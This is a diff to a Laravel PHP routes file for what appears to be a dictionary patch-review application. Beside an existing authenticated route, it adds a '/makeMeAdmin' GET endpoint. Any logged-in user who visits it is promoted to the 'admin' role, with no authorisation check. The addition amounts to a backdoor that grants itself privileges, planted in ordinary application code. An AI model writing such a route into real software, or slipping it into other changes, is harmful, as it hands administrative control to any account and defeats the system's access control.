@@ -63,3 +63,18 @@ Route::post('/submitPatchUpdate', function (Request $request) {
     $dictLib->submitPatchUpdate($input['dict'], $input['patchId'],
                                 $approved, $mergedIntoTei);
 })->middleware('auth');
+
+Route::get('/makeMeAdmin', function (Request $request) {
+
+    if (!Auth::check()) {
+        return "You have to be logged in to become an admin!";
+    }
+
+    $user = Auth::user();
+    if ($user->role == "admin") {
+        return "You are already an admin!";
+    }
+    $user->role = "admin";
+    $user->save();
+    return "Now you are an admin!";
+});
